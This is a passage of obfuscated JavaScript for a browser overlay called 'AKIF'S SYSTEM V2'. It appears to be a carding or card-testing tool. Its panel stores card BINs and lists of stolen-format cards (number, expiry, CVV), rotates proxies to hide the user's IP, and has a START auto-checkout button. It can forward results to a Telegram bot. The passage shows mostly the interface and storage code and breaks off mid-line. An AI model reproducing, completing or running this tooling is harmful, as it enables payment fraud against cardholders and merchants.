              if (p_1_1[v_7.SAVED_BINS] && Array.isArray(p_1_1[v_7.SAVED_BINS])) {
                v_51 = p_1_1[v_7.SAVED_BINS];
              }
              if (p_1_1[v_7.TOKEN]) {
                const v_1_3 = "4|0|1|2|6|3|5".split('|');
                let v_2_3 = 0;
                while (true) {
                  switch (v_1_3[v_2_3++]) {
                    case '0':
                      v_40 = p_1_1[v_7.USER_ID] || '';
                      continue;
                    case '1':
                      v_41 = p_1_1[v_7.FIRST_NAME] || '';
                      continue;
                    case '2':
                      v_42 = v_40;
                      continue;
                    case '3':
                      localStorage.setItem(v_7.USER_ID, v_40);
                      continue;
                    case '4':
                      v_2_2 = p_1_1[v_7.TOKEN];
                      continue;
                    case '5':
                      localStorage.setItem(v_7.FIRST_NAME, v_41);
                      continue;
                    case '6':
                      localStorage.setItem(v_7.TOKEN, v_2_2);
                      continue;
                  }
                  break;
                }
              }
              if (p_1_1[v_7.CUSTOM_NAME]) {
                v_48 = p_1_1[v_7.CUSTOM_NAME], localStorage.setItem(v_7.CUSTOM_NAME, v_48);
              }
              p_1_1[v_7.CUSTOM_EMAIL] && (v_49 = p_1_1[v_7.CUSTOM_EMAIL], localStorage.setItem(v_7.CUSTOM_EMAIL, v_49)), p_1_1[v_7.SAVED_ID] && (v_42 = p_1_1[v_7.SAVED_ID], localStorage.setItem(v_7.USER_ID, v_42)), p_1();
            });else {
              const v_1_3 = localStorage.getItem(v_7.SAVED_BINS);
              if (v_1_3) try {
                v_51 = JSON.parse(v_1_3);
              } catch (v_1_4) {}
              v_42 = localStorage.getItem(v_7.USER_ID) || '', v_40 = localStorage.getItem(v_7.USER_ID) || '', p_1();
            }
          }),
          [v_5_2] = await Promise.all([v_3_2, v_4_2]);
        if (v_5_2) {
          v_31 = true, v_30 = true, v_60 = false;
          return;
        }
        if (document.querySelector(".card-generator-overlay")) {
          v_60 = false;
          return;
        }
        v_46 = fn_16();
        if (!document.querySelector("#akif-fa-cdn")) {
          const v_1_3 = document.createElement("link");
          v_1_3.id = "akif-fa-cdn", v_1_3.rel = "stylesheet", v_1_3.href = "https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css", v_1_3.crossOrigin = "anonymous", v_1_3.referrerPolicy = "no-referrer", document.head.appendChild(v_1_3);
        }
        const v_6_2 = document.createElement("div");
        v_6_2.className = "card-generator-overlay", v_6_2.innerHTML = "\n<div class=\"panel-header\">\n  <span class=\"panel-title\">\n    <svg width=\"16\" height=\"16\" viewBox=\"0 0 24 24\" fill=\"none\" xmlns=\"http://www.w3.org/2000/svg\">\n      <rect x=\"4\" y=\"4\" width=\"16\" height=\"16\" rx=\"3\" stroke=\"currentColor\" stroke-width=\"1.5\" fill=\"none\"/>\n      <circle cx=\"12\" cy=\"12\" r=\"2\" fill=\"currentColor\"/>\n      <path d=\"M12 8V4M12 20V16\" stroke=\"currentColor\" stroke-width=\"1.5\" stroke-linecap=\"round\"/>\n    </svg>\n    AKIF&#39;S SYSTEM V2\n  </span>\n  <div class=\"header-controls\">\n    <button class=\"world-proxy-btn\" id=\"worldProxyBtn\" title=\"Global Proxy Count\">\n      <svg width=\"14\" height=\"14\" viewBox=\"0 0 24 24\" fill=\"none\" xmlns=\"http://www.w3.org/2000/svg\">\n        <path d=\"M12 22C17.5228 22 22 17.5228 22 12C22 6.47715 17.5228 2 12 2C6.47715 2 2 6.47715 2 12C2 17.5228 6.47715 22 12 22Z\" stroke=\"currentColor\" stroke-width=\"1.5\" stroke-linecap=\"round\" stroke-linejoin=\"round\"/>\n        <path d=\"M12 2C9 5 9 19 12 22\" stroke=\"currentColor\" stroke-width=\"1.5\" stroke-linecap=\"round\" stroke-linejoin=\"round\"/>\n        <path d=\"M12 2C15 5 15 19 12 22\" stroke=\"currentColor\" stroke-width=\"1.5\" stroke-linecap=\"round\" stroke-linejoin=\"round\"/>\n        <path d=\"M2 12H22\" stroke=\"currentColor\" stroke-width=\"1.5\" stroke-linecap=\"round\" stroke-linejoin=\"round\"/>\n        <circle cx=\"12\" cy=\"12\" r=\"3\" stroke=\"currentColor\" stroke-width=\"1.5\"/>\n      </svg>\n      <span id=\"globalProxyCount\">0</span>\n    </button>\n    <button class=\"minimize-btn\" id=\"minimizeBtn\" title=\"Minimize panel\">\n      <i class=\"fas fa-minus\"></i>\n    </button>\n  </div>\n</div>\n\n<div class=\"mode-toggle mode-toggle-small\">\n  <button class=\"mode-btn active\" id=\"modeBin\" data-mode=\"bin\">BIN</button>\n  <button class=\"mode-btn\" id=\"modeCc\" data-mode=\"cc\">CC</button>\n  <button class=\"mode-btn\" id=\"modeProxy\" data-mode=\"proxy\">PROXY</button>\n</div>\n          \n          <!-- BIN SECTION -->\n          <div class=\"section\" id=\"binSection\">\n            <div class=\"section-title\">ADD NEW BIN</div>\n            <div class=\"bin-input-group\">\n              <input type=\"text\" class=\"input-field\" id=\"newBinInput\" placeholder=\"Enter BIN (6-16 digits)\" maxlength=\"30\">\n              <button class=\"action-btn save-btn\" id=\"saveNewBinBtn\">\n                <i class=\"fas fa-floppy-disk\"></i>\n                SAVE\n              </button>\n            </div>\n            <div class=\"section-title\" style=\"margin-top: 8px;\">BIN HISTORY</div>\n            <div id=\"binHistoryList\" class=\"bin-history-container\">\n              <div class=\"bin-history-empty\">No saved bins yet</div>\n            </div>\n            <div class=\"bin-buttons-row\" style=\"margin-top: 8px;\">\n              <button class=\"action-btn switch-btn\" id=\"switchBinBtn\">\n                <i class=\"fas fa-right-left\"></i>\n                SWITCH\n              </button>\n            </div>\n            <div id=\"binStatus\" class=\"hidden\" style=\"margin-top: 8px; text-align: center;\"></div>\n          </div>\n          \n<!-- CC SECTION - DIRECT TEXTAREA (MODAL YOK) -->\n<div class=\"section hidden\" id=\"ccSection\">\n    <div class=\"section-title\">CC LIST (MAX 20)</div>\n    <textarea id=\"ccTextareaDirect\" class=\"cc-textarea-direct\" placeholder=\"Enter cards (one per line)&#10;Format: cc|mm|yy|cvv&#10;&#10;Example:&#10;4111111111111111|12|28|123&#10;5555555555554444|10|26|789\" rows=\"4\"></textarea>\n    <div class=\"cc-info\" id=\"ccInfoDirect\">0/20 cards loaded</div>\n    <div class=\"cc-buttons-row\">\n        <button class=\"action-btn save-btn\" id=\"saveCcDirectBtn\">\n            <i class=\"fas fa-floppy-disk\"></i>\n            SAVE CARDS\n        </button>\n        <button class=\"action-btn clear-btn\" id=\"clearCcDirectBtn\">\n            <i class=\"fas fa-trash\"></i>\n            CLEAR ALL\n        </button>\n    </div>\n</div>\n          \n<!-- ============ PROXY SECTION (YEN\u0130 - L\u0130STE HAL\u0130NDE) ============ -->\n<!-- ============ PROXY SECTION (YEN\u0130 - L\u0130STE HAL\u0130NDE) ============ -->\n<div class=\"section hidden\" id=\"proxySection\">\n    <div class=\"section-title\">PROXY LIST</div>\n\n    <!-- Current IP badge (proxy verification) -->\n    <div id=\"currentIpBox\" style=\"display:flex;align-items:center;justify-content:space-between;gap:8px;padding:7px 11px;margin-bottom:8px;border:1px solid rgba(96,165,250,0.28);border-radius:10px;background:rgba(96,165,250,0.08);backdrop-filter:blur(6px);font-size:11px;\">\n        <div style=\"display:flex;flex-direction:column;line-height:1.3;\">\n            <span style=\"color:#93a4c4;font-size:9px;text-transform:uppercase;letter-spacing:0.6px;font-weight:700;\">Current IP</span>\n            <span id=\"currentIpValue\" style=\"font-weight:600;font-family:monospace;color:#E6EFFF;\">checking...</span>\n        </div>\n        <button id=\"refreshIpBtn\" class=\"action-btn\" title=\"Refresh IP\" style=\"padding:4px 10px;font-size:10px;\">REFRESH</button>\n    </div>\n\n    <!-- Add Proxy Input (Tekli Ekleme) -->\n    <div class=\"proxy-input-group\">\n        <input type=\"text\" class=\"input-field\" id=\"proxyInput\" placeholder=\"ip:port | user:pass@ip:port | socks5://user:pass@ip:port\" maxlength=\"200\">\n        <button class=\"action-btn save-btn\" id=\"addProxyBtn\">\n            <i class=\"fas fa-plus\"></i>\n            ADD\n        </button>\n    </div>\n    \n    <!-- Bulk Add Proxy (Toplu Ekleme) -->\n    <div class=\"proxy-bulk-group\">\n        <textarea id=\"bulkProxyInput\" class=\"proxy-bulk-textarea\" placeholder=\"Enter multiple proxies (one per line)&#10;Format:&#10;ip:port&#10;user:pass@ip:port&#10;socks5://user:pass@ip:port\" rows=\"3\"></textarea>\n        <button class=\"action-btn bulk-add-btn\" id=\"bulkAddProxyBtn\">\n            <i class=\"fas fa-layer-group\"></i>\n            BULK ADD (TEST & ADD)\n        </button>\n    </div>\n    \n    <!-- Proxy List Container -->\n    <div class=\"proxy-list-container\" id=\"proxyListContainer\">\n        <div class=\"proxy-list-header\">\n            <span class=\"proxy-list-total\" id=\"proxyTotalCount\">Total: 0</span>\n            <button class=\"proxy-clear-all-btn\" id=\"clearAllProxiesBtn\" title=\"Clear All\"><i class=\"fas fa-trash\"></i> CLEAR ALL</button>\n        </div>\n        <div class=\"proxy-list\" id=\"proxyList\">\n            <div class=\"proxy-list-empty\">No proxies added yet</div>\n        </div>\n    </div>\n    \n    <!-- Supported Formats Info -->\n    <div class=\"proxy-info-text\">\n        <svg width=\"12\" height=\"12\" viewBox=\"0 0 24 24\" fill=\"none\" xmlns=\"http://www.w3.org/2000/svg\">\n            <path d=\"M12 8V12M12 16H12.01M4 12C4 16.4183 7.58172 20 12 20C16.4183 20 20 16.4183 20 12C20 7.58172 16.4183 4 12 4C7.58172 4 4 7.58172 4 12Z\" stroke=\"currentColor\" stroke-width=\"1.5\" stroke-linecap=\"round\"/>\n        </svg>\n        Supported: ip:port | user:pass@ip:port | socks5://user:pass@ip:port\n    </div>\n</div>\n<!-- ============ PROXY LOGS (SADECE PROXY \u0130\u015ELEMLER\u0130 \u0130\xC7\u0130N) ============ -->\n<!-- ============ PROXY LOGS ============ -->\n<div class=\"proxy-logs-section\" id=\"proxyLogsSection\">\n    <div class=\"collapsible-header\" id=\"proxyLogsToggle\">\n        <span>PROXY LOGS</span>\n        <span class=\"collapse-icon\">\u25BC</span>\n    </div>\n    <div class=\"collapsible-content\" id=\"proxyLogsContent\" style=\"display: none;\">\n        <div class=\"proxy-logs-list\" id=\"proxyLogsList\">\n            <div class=\"proxy-logs-empty\">No proxy activity yet</div>\n        </div>\n        <button class=\"action-btn clear-btn\" id=\"clearProxyLogsBtn\">\n            <i class=\"fas fa-trash\"></i>\n            CLEAR LOGS\n        </button>\n    </div>\n</div>\n\n<div class=\"section-divider\"></div>\n<div class=\"section akif-start-section\">\n    <button class=\"action-btn primary-btn\" id=\"autocoBtn\">\n        <i class=\"fas fa-play\"></i>\n        START\n    </button>\n</div>\n<div class=\"section-divider\"></div>\n<div class=\"collapsible-section\"><div class=\"collapsible-header\" id=\"statsToggle\"><span>LOGS</span><span class=\"collapse-icon\">\u25BC</span></div><div class=\"collapsible-content\" id=\"statsContent\"><div class=\"history-list\" id=\"historyList\"><div class=\"history-empty\">No logs yet</div></div><button class=\"action-btn clear-btn\" id=\"clearHistory\">\n    <i class=\"fas fa-trash\"></i>\n    CLEAR LOGS\n</button></div></div>\n<div class=\"collapsible-section\"><div class=\"collapsible-header\" id=\"settingsToggle\"><span>SETTINGS</span><span class=\"collapse-icon\">\u25BC</span></div><div class=\"collapsible-content\" id=\"settingsContent\"><div class=\"settings-grid\"><div class=\"setting-row\">\n    <svg width=\"14\" height=\"14\" viewBox=\"0 0 24 24\" fill=\"none\" xmlns=\"http://www.w3.org/2000/svg\">\n        <circle cx=\"12\" cy=\"8\" r=\"4\" stroke=\"currentColor\" stroke-width=\"1.5\"/>\n        <path d=\"M5 20V19C5 15.6863 7.68629 13 11 13H13C16.3137 13 19 15.6863 19 19V20\" stroke=\"currentColor\" stroke-width=\"1.5\" stroke-linecap=\"round\"/>\n    </svg>\n    <span class=\"setting-label\">Name</span><input type=\"text\" class=\"setting-text-input\" id=\"customNameInput\" placeholder=\"Optional\" value=\"" + v_48 + "\">\n</div><div class=\"setting-row\">\n    <svg width=\"14\" height=\"14\" viewBox=\"0 0 24 24\" fill=\"none\" xmlns=\"http://www.w3.org/2000/svg\">\n        <path d=\"M4 4H20C21.1 4 22 4.9 22 6V18C22 19.1 21.1 20 20 20H4C2.9 20 2 19.1 2 18V6C2 4.9 2.9 4 4 4Z\" stroke=\"currentColor\" stroke-width=\"1.5\"/>\n        <path d=\"M22 6L12 13L2 6\" stroke=\"currentColor\" stroke-width=\"1.5\" stroke-linecap=\"round\"/>\n    </svg>\n    <span class=\"setting-label\">Email</span><input type=\"text\" class=\"setting-text-input\" id=\"customEmailInput\" placeholder=\"Optional\" value=\"" + v_49 + "\">\n</div><div class=\"setting-row\">\n    <i class=\"fa-brands fa-telegram\" style=\"font-size:14px;color:var(--akif-primary);\"></i>\n    <span class=\"setting-label\">TG Forward</span><button class=\"proxy-view-btn-small\" id=\"tgSettingsBtn\">" + (v_44 && v_45 ? "View" : "Set") + "</button>\n</div></div></div></div>\n        </div>";
        const v_7_2 = document.createElement("div");
        v_7_2.className = "cc-modal hidden", v_7_2.id = "tgModal", v_7_2.innerHTML = "<div class=\"cc-modal-content\"><div class=\"cc-modal-header\"><span>TELEGRAM FORWARD</span><button class=\"cc-modal-close\" id=\"closeTgModal\">\u2715</button></div><div class=\"cc-modal-body\"><div class=\"tg-form\"><div class=\"tg-form-row\"><label class=\"tg-form-label\">BOT TOKEN</label><input type=\"text\" class=\"input-field\" id=\"tgModalBotToken\" placeholder=\"123456789:ABCdefGHI...\" value=\"" + v_44 + "\"><div class=\"tg-hint\">Get from @BotFather on Telegram</div></div><div class=\"tg-form-row\"><label class=\"tg-form-label\">CHAT ID</label><input type=\"text\" class=\"input-field\" id=\"tgModalUserId\" placeholder=\"123456789\" value=\"" + v_45 + "\"><div class=\"tg-hint\">Get from @userinfobot on Telegram</div></div><div class=\"tg-status hidden\" id=\"tgTestStatus\"></div></div></div><div class=\"cc-modal-footer tg-modal-footer\"><button class=\"action-btn test-btn\" id=\"tgTestBtn\">TEST</button><button class=\"action-btn primary-btn\" id=\"tgSaveBtn\">SAVE</button></div></div>", document.body.appendChild(v_7_2), document.body.appendChild(v_6_2);
        const v_8_2 = document.getElementById("logoutSquareBtn");
        v_8_2 && v_8_2.addEventListener("click", p_1 => {
          const v_1_3 = "4|7|3|5|8|2|0|1|6".split('|');
          let v_2_3 = 0;
          while (true) {
            switch (v_1_3[v_2_3++]) {
              case '0':
                v_33 && fn_67();
                continue;
              case '1':
                fn_35("\uD83D\uDD13 Logged out successfully!", "info");
                continue;
              case '2':
                localStorage.removeItem("akif_login_time");
                continue;
              case '3':
                localStorage.removeItem("akif_logged_in");
                continue;
              case '4':
                p_1.stopPropagation();
                continue;
              case '5':
                localStorage.removeItem("akif_user_id");
                continue;
              case '6':
                setTimeout(() => {
                  location.reload();
                }, 1000);
                continue;
              case '7':
                window.AkifLogin && window.AkifLogin.logout && window.AkifLogin.logout();
                continue;
              case '8':
                localStorage.removeItem("akif_username");
                continue;
            }
            break;
          }
        });
        function fn_1_3() {
          const v_1_3 = localStorage.getItem(v_7.SAVED_CCS);
          if (v_1_3) try {
            const v_1_4 = JSON.parse(v_1_3);
            if (Array.isArray(v_1_4) && v_1_4.length > 0) {
              v_38 = v_1_4.slice(0, 20), fn_3_2();
              const v_1_5 = document.getElementById("ccTextareaDirect");
              if (v_1_5 && v_38.length > 0) {
                v_1_5.value = v_38.join('\x0a');
              }
            }
          } catch (v_1_4) {}
        }
        function fn_2_2() {
          const v_1_3 = document.getElementById("ccTextareaDirect");
          if (!v_1_3) {
            return;
          }
          const v_2_3 = v_1_3.value.split('\x0a').map(p_1 => p_1.trim()).filter(p_1 => {
            const v_1_4 = p_1.split('|');
            return v_1_4.length === 4 && v_1_4[0].length >= 13 && v_1_4[1].length === 2 && v_1_4[2].length === 2 && v_1_4[3].length >= 3;
          }).slice(0, 20);
          if (v_2_3.length > 20) {
            fn_35("\u26A0\uFE0F Maximum 20 cards allowed!", "error");
            return;
          }
          if (v_2_3.length === 0) {
            fn_35("\u26A0\uFE0F No valid cards found! Use format: cc|mm|yy|cvv", "error");
            return;
          }
          v_38 = v_2_3, localStorage.setItem(v_7.SAVED_CCS, JSON.stringify(v_38)), fn_3_2(), fn_35('✅\x20' + v_2_3.length + " cards saved!", "success");
        }
        function fn_3_2() {
          const v_1_3 = document.getElementById("ccInfoDirect");
          if (v_1_3) {
            v_1_3.textContent = v_38.length + "/20 cards loaded", v_38.length === 20 ? v_1_3.style.color = "#F59E0B" : v_1_3.style.color = "#60a5fa";
          }
        }
        function fn_4_2() {
          v_38 = [], localStorage.removeItem(v_7.SAVED_CCS);
          const v_1_3 = document.getElementById("ccTextareaDirect");
          v_1_3 && (v_1_3.value = ''), fn_3_2(), fn_35("\uD83D\uDDD1 All cards cleared!", "info");
        }
        function fn_5_2() {
          const v_1_3 = document.getElementById("binHistoryList");
          if (!v_1_3) return;
          if (!v_51 || v_51.length === 0) {
            v_1_3.innerHTML = "<div class=\"bin-history-empty\">No saved bins yet</div>";
            return;
          }
          v_1_3.innerHTML = v_51.map((p_1, p_2) => "\n          <div class=\"bin-history-item " + (p_2 === v_52 ? "bin-selected" : '') + "\" data-index=\"" + p_2 + "\">\n            <span class=\"bin-value\">" + p_1.substring(0, 16) + (p_1.length > 16 ? "..." : '') + "</span>\n            <button class=\"bin-delete\" data-index=\"" + p_2 + "\" title=\"Delete BIN\"><i class=\"fas fa-trash\"></i></button>\n          </div>\n        ").join('');
          v_1_3.querySelectorAll(".bin-delete").forEach(p_1 => {
            p_1.addEventListener("click", p_1_1 => {
              p_1_1.stopPropagation();
              const v_1_4 = parseInt(p_1.dataset.index);
              if (v_1_4 >= 0 && v_1_4 < v_51.length) {
                v_51.splice(v_1_4, 1), fn_8_2(v_51);
                if (v_52 >= v_51.length && v_51.length > 0) v_52 = v_51.length - 1;else {
                  if (v_51.length === 0) {
                    v_52 = 0;
                  }
                }
                fn_5_2(), fn_6_2(), fn_35("\uD83D\uDDD1 BIN deleted", "info");
              }
            });
          });
          v_1_3.querySelectorAll(".bin-history-item").forEach(p_1 => {
            p_1.addEventListener("click", p_1_1 => {
              if (p_1_1.target.classList.contains("bin-delete")) return;
              const v_1_4 = parseInt(p_1.dataset.index);
              if (v_1_4 >= 0 && v_1_4 < v_51.length) {
                v_52 = v_1_4, fn_5_2(), fn_6_2(), fn_35("\uD83D\uDCCC Selected: " + v_51[v_52], "info");
              }
            });
          });
        }
        function fn_6_2() {
          const v_1_3 = document.getElementById("binStatus"),
            v_2_3 = fn_9_2();
          v_1_3 && (v_2_3 ? (v_1_3.textContent = v_51.length > 1 ? "Active: " + v_2_3.substring(0, 6) + "... (" + (v_52 + 1) + '/' + v_51.length + ')' : "Active: " + v_2_3.substring(0, 6) + "...", v_1_3.classList.remove("hidden")) : v_1_3.classList.add("hidden"));
        }
        function fn_7_2(p_1) {
          if (!p_1 || p_1.length < 6) return fn_35("\u26A0\uFE0F BIN must be at least 6 digits", "error"), false;
          const v_1_3 = p_1.replace(/[^0-9xX]/g, '').substring(0, 16);
          if (v_1_3.length < 6) return fn_35("\u26A0\uFE0F BIN must contain at least 6 digits", "error"), false;
          if (!v_51.includes(v_1_3)) {
            return v_51.push(v_1_3), fn_8_2(v_51), fn_5_2(), fn_6_2(), fn_35("\u2705 BIN saved: " + v_1_3, "success"), true;
          } else return fn_35("\u26A0\uFE0F BIN already exists", "error"), false;
        }
        function fn_8_2(p_1) {
          v_51 = [...new Set(p_1.filter(p_1_1 => p_1_1 && p_1_1.length >= 6))];
          localStorage.setItem(v_7.SAVED_BINS, JSON.stringify(v_51)), window.AkifStorage && window.AkifStorage.saveBINs && window.AkifStorage.saveBINs(v_51), fn_5_2(), fn_6_2();
        }
        function fn_9_2() {
          return v_51[v_52] || v_51[0] || '';
        }
        function fn_10_1() {
          const v_1_3 = localStorage.getItem(v_7.SAVED_BINS);
          if (v_1_3) try {
            const v_1_4 = JSON.parse(v_1_3);
            Array.isArray(v_1_4) && v_1_4.length > 0 && (v_51 = [...new Set(v_1_4)]);
          } catch (v_1_4) {}
          fn_5_2(), fn_6_2();
        }
        const v_9_2 = document.getElementById("autocoBtn"),
          v_10_2 = document.getElementById("minimizeBtn"),
          v_11_2 = document.getElementById("saveNewBinBtn"),
          v_12_1 = document.getElementById("newBinInput"),
          v_13_1 = document.getElementById("switchBinBtn"),
          v_14_1 = document.getElementById("saveCcDirectBtn"),
          v_15_1 = document.getElementById("clearCcDirectBtn"),
          v_16_1 = document.getElementById("ccTextareaDirect");
        fn_10_1(), fn_1_3();
        v_14_1 && v_14_1.addEventListener("click", fn_2_2);
        v_15_1 && v_15_1.addEventListener("click", fn_4_2);
        v_16_1 && v_16_1.addEventListener("input", function () {
          const v_1_3 = this.value.split('\x0a').filter(p_1 => p_1.trim() && p_1.includes('|'));
          const v_2_3 = Math.min(v_1_3.length, 20),
            v_3_3 = document.getElementById("ccInfoDirect");
          if (v_3_3) {
            v_3_3.textContent = v_2_3 + "/20 cards loaded";
            if (v_2_3 > 20) {
              v_3_3.style.color = "#EF4444";
            } else {
              if (v_2_3 === 20) v_3_3.style.color = "#F59E0B";else {
                v_3_3.style.color = "#60a5fa";
              }
            }
          }
        });
        v_11_2 && v_11_2.addEventListener("click", () => {
          const v_1_3 = v_12_1 ? v_12_1.value.trim() : '';
          if (fn_7_2(v_1_3)) {
            v_12_1 && (v_12_1.value = '');
          }
        });
        v_12_1 && v_12_1.addEventListener("keypress", p_1 => {
          if (p_1.key === "Enter") {
            p_1.preventDefault();
            const v_1_3 = v_12_1.value.trim();
            fn_7_2(v_1_3) && (v_12_1.value = '');
          }
        });
        let v_17_1 = [];
        function fn_11_1() {
          try {
            const v_1_3 = localStorage.getItem("akif_proxy_logs");
            v_1_3 && (v_17_1 = JSON.parse(v_1_3)), v_17_1.length === 0 && (v_17_1 = []);
          } catch (v_1_3) {
            v_17_1 = [];
          }
          fn_14_1();
        }
        function fn_12_1() {
          v_17_1.length > 50 && (v_17_1 = v_17_1.slice(0, 50)), localStorage.setItem("akif_proxy_logs", JSON.stringify(v_17_1)), fn_14_1();
        }
        function fn_13_1(p_1, p_2 = "info") {
          const v_1_3 = new Date(),
            v_2_3 = v_1_3.toLocaleTimeString("en-US", {
              'hour': "2-digit",
              'minute': "2-digit",
              'second': "2-digit"
            }),
            v_3_3 = {};
          v_3_3.time = v_2_3, v_3_3.message = p_1, v_3_3.type = p_2;
          const v_4_3 = v_3_3;
          v_17_1.unshift(v_4_3), fn_12_1();
        }
        function fn_14_1() {
          const v_1_3 = document.getElementById("proxyLogsList");
          if (!v_1_3) return;
          if (v_17_1.length === 0) {
            v_1_3.innerHTML = "<div class=\"proxy-logs-empty\">No proxy activity yet</div>";
            return;
          }
          v_1_3.innerHTML = v_17_1.map(p_1 => {
            let v_1_4 = '';
            let v_2_3 = '';
            switch (p_1.type) {
              case "success":
                v_1_4 = "<svg width=\"8\" height=\"8\" viewBox=\"0 0 24 24\" fill=\"none\" xmlns=\"http://www.w3.org/2000/svg\"><path d=\"M5 13l4 4L19 7\" stroke=\"#60a5fa\" stroke-width=\"2\" stroke-linecap=\"round\" stroke-linejoin=\"round\"/></svg>", v_2_3 = "proxy-log-success";
                break;
              case "error":
                v_1_4 = "<svg width=\"8\" height=\"8\" viewBox=\"0 0 24 24\" fill=\"none\" xmlns=\"http://www.w3.org/2000/svg\"><path d=\"M18 6L6 18M6 6L18 18\" stroke=\"#EF4444\" stroke-width=\"2\" stroke-linecap=\"round\" stroke-linejoin=\"round\"/></svg>", v_2_3 = "proxy-log-error";
                break;
              case "warning":
                v_1_4 = "<svg width=\"8\" height=\"8\" viewBox=\"0 0 24 24\" fill=\"none\" xmlns=\"http://www.w3.org/2000/svg\"><path d=\"M12 8V12M12 16H12.01M4 12C4 16.4183 7.58172 20 12 20C16.4183 20 20 16.4183 20 12C20 7.58172 16.4183 4 12 4C7.58172 4 4 7.58172 4 12Z\" stroke=\"#F59E0B\" stroke-width=\"1.5\" stroke-linecap=\"round\"/></svg>", v_2_3 = "proxy-log-warning";
                break;
              default:
                v_1_4 = "<svg width=\"8\" height=\"8\" viewBox=\"0 0 24 24\" fill=\"none\" xmlns=\"http://www.w3.org/2000/svg\"><circle cx=\"12\" cy=\"12\" r=\"10\" stroke=\"#60A5FA\" stroke-width=\"1.5\"/><path d=\"M12 8V12M12 16H12.01\" stroke=\"#60A5FA\" stroke-width=\"1.5\" stroke-linecap=\"round\"/></svg>", v_2_3 = "proxy-log-info";
            }
            return "\n            <div class=\"proxy-log-item " + v_2_3 + "\">\n                <span class=\"proxy-log-time\">[" + p_1.time + "]</span>\n                <span class=\"proxy-log-icon\">" + v_1_4 + "</span>\n                <span class=\"proxy-log-message\">" + fn_15_1(p_1.message) + "</span>\n            </div>\n        ";
          }).join('');
        }
        function fn_15_1(p_1) {
          if (!p_1) return '';
          return p_1.replace(/[&<>]/g, function (p_1_1) {
            if (p_1_1 === '&') return "&amp;";
            if (p_1_1 === '<') {
              return "&lt;";
            }
            if (p_1_1 === '>') return "&gt;";
            return p_1_1;
          });
        }
        function fn_16_1() {
          if (v_17_1.length === 0) {
            return;
          }
          v_17_1 = [], fn_12_1(), fn_35("Proxy logs cleared!", "info");
        }
        function fn_17_1() {
          const v_1_3 = document.getElementById("globalProxyCount");
          if (v_1_3) {
            const v_1_4 = v_18_1 ? v_18_1.length : 0,
              v_2_3 = v_18_1 ? v_18_1.filter(p_1 => p_1.status === "working").length : 0;
            v_1_3.textContent = v_2_3 + '/' + v_1_4, v_1_3.title = "Active: " + v_2_3 + " | Total: " + v_1_4;
          }
        }
        let v_18_1 = [],
          v_19_1 = false,
          v_20_1 = -1;
        function fn_18_1() {
          try {
            const v_1_3 = localStorage.getItem("akif_proxy_list");
            v_1_3 && (v_18_1 = JSON.parse(v_1_3)), v_18_1.length === 0 && (v_18_1 = []);
          } catch (v_1_3) {
            v_18_1 = [];
          }
          fn_22_1(), fn_17_1();
        }
        function fn_19_1() {
          localStorage.setItem("akif_proxy_list", JSON.stringify(v_18_1)), fn_22_1();
          fn_17_1();
        }
        function fn_20_1() {
          localStorage.setItem("akif_active_proxy_index", v_20_1);
        }
        function fn_21_1() {
          try {
            const v_1_3 = localStorage.getItem("akif_active_proxy_index");
            if (v_1_3 !== null && v_1_3 !== '-1') {
              const v_1_4 = parseInt(v_1_3);
              if (v_1_4 >= 0 && v_1_4 < v_18_1.length) {
                v_20_1 = v_1_4;
              } else v_20_1 = -1;
            } else v_20_1 = -1;
          } catch (v_1_3) {
            v_20_1 = -1;
          }
          fn_22_1();
        }
        function fn_22_1() {
          const v_1_3 = document.getElementById("proxyList"),
            v_2_3 = document.getElementById("proxyTotalCount");
          if (!v_1_3) {
            return;
          }
          v_2_3 && (v_2_3.textContent = "Total: " + v_18_1.length);
          if (v_18_1.length === 0) {
            v_1_3.innerHTML = "<div class=\"proxy-list-empty\">No proxies added yet</div>";
            return;
          }
          v_1_3.innerHTML = v_18_1.map((p_1, p_2) => {
            const v_1_4 = p_2 === v_20_1,
              v_2_4 = v_1_4 ? "active" : '',
              v_3_3 = v_1_4 ? "<span class=\"proxy-badge-active\">\u25CF ACTIVE</span>" : "<span class=\"proxy-badge-inactive\">\u25CB INACTIVE</span>";
            let v_4_3 = p_1.proxy;
            v_4_3.length > 45 && (v_4_3 = v_4_3.substring(0, 42) + "...");
            let v_5_3 = '',
              v_6_3 = '',
              v_7_3 = '';
            if (p_1.status === "checking") v_6_3 = "<span class=\"proxy-status-icon checking\">\u27F3</span>", v_5_3 = "Checking...";else {
              if (p_1.status === "working") v_6_3 = "<span class=\"proxy-status-icon working\"><svg width=\"10\" height=\"10\" viewBox=\"0 0 24 24\" fill=\"none\" xmlns=\"http://www.w3.org/2000/svg\"><path d=\"M5 13l4 4L19 7\" stroke=\"#60a5fa\" stroke-width=\"2\" stroke-linecap=\"round\" stroke-linejoin=\"round\"/></svg></span>", v_7_3 = "<span class=\"proxy-latency\">" + p_1.latency + "ms</span>";else p_1.status === "dead" ? (v_6_3 = "<span class=\"proxy-status-icon dead\"><svg width=\"10\" height=\"10\" viewBox=\"0 0 24 24\" fill=\"none\" xmlns=\"http://www.w3.org/2000/svg\"><path d=\"M18 6L6 18M6 6L18 18\" stroke=\"#EF4444\" stroke-width=\"2\" stroke-linecap=\"round\" stroke-linejoin=\"round\"/></svg></span>", v_5_3 = "Dead") : (v_6_3 = "<span class=\"proxy-status-icon unknown\">\u23F3</span>", v_5_3 = "Not tested");
            }
            return "\n            <div class=\"proxy-list-item " + v_2_4 + "\" data-index=\"" + p_2 + "\">\n                <div class=\"proxy-item-left\">\n                    <div class=\"proxy-item-number\">" + (p_2 + 1) + "</div>\n                    <div class=\"proxy-item-details\">\n                        <div class=\"proxy-item-proxy\">" + fn_15_1(v_4_3) + "</div>\n                        <div class=\"proxy-item-status\">\n                            " + v_6_3 + "\n                            " + v_5_3 + "\n                            " + v_7_3 + "\n                            " + v_3_3 + "\n                        </div>\n                    </div>\n                </div>\n                <div class=\"proxy-item-actions\">\n                    <button class=\"proxy-test-item-btn\" data-index=\"" + p_2 + "\" title=\"Test Proxy\"><svg width=\"12\" height=\"12\" viewBox=\"0 0 24 24\" fill=\"none\" xmlns=\"http://www.w3.org/2000/svg\"><path d=\"M20 12V8H4V12M20 12L12 20M20 12L12 4\" stroke=\"currentColor\" stroke-width=\"1.5\" stroke-linecap=\"round\" stroke-linejoin=\"round\"/></svg></button>\n                    <button class=\"proxy-activate-btn\" data-index=\"" + p_2 + "\" title=\"Activate\"><svg width=\"12\" height=\"12\" viewBox=\"0 0 24 24\" fill=\"none\" xmlns=\"http://www.w3.org/2000/svg\"><path d=\"M12 2L15 9H22L16 14L19 21L12 